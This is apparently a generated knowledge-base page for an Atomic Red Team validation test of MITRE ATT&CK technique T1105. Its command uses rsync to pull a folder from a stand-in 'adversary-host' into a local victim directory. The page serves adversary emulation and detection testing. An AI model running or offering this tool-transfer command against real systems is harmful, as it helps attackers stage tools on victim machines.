---
atomic_guid: "3180f7d5-52c0-4493-9ea0-e3431a84773f"
title: "rsync remote file copy (pull)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-27 19:12:27"
executor: "sh"
aliases:
  - "3180f7d5-52c0-4493-9ea0-e3431a84773f"
  - "rsync remote file copy (pull)"
platforms:
  - "linux"
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Utilize rsync to perform a remote file copy (pull)

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Input Arguments

### local_path

- description: Local path to receive rsync
- type: path
- default: /tmp/victim-files

### remote_host

- description: Remote host to copy from
- type: string
- default: adversary-host

### remote_path

- description: Path of folder to copy
- type: path
- default: /tmp/adversary-rsync/

### username

- description: User account to authenticate on remote host
- type: string
- default: adversary

## Dependencies

rsync must be installed on the machine

### Prerequisite Check

```bash
if [ -x "$(command -v rsync)" ]; then exit 0; else exit 1; fi
```

### Get Prerequisite

```bash
(pkg install -y rsync)||(sudo apt-get -y install rsync)
```

## Executor

- name: sh

### Command

```bash
rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
